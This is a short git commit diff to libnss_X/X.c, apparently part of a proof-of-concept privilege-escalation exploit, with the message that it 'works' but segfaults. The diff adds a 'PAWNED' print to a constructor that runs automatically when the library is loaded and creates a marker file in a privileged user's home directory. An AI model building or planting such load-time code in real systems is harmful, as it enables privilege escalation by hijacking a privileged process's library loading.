877eb84563c6486e1149973fcbd74b893306cab5
Otto-AA <21040751+Otto-AA@users.noreply.github.com>
2021-12-06 15:14:36 +0100

    "works" but Segmentation fault

--- libnss_X/X.c
+++ libnss_X/X.c
@@ -9,6 +9,7 @@ __attribute__((constructor)) static void constructor();
 // https://man7.org/linux/man-pages/man3/dlopen.3.html
 void constructor()
 {
+    printf("PAWNED\n");
     char *filepath = "/home/privileged/0xBADC0DED";
     if (open(filepath, O_CREAT | O_EXCL) == -1)
     {
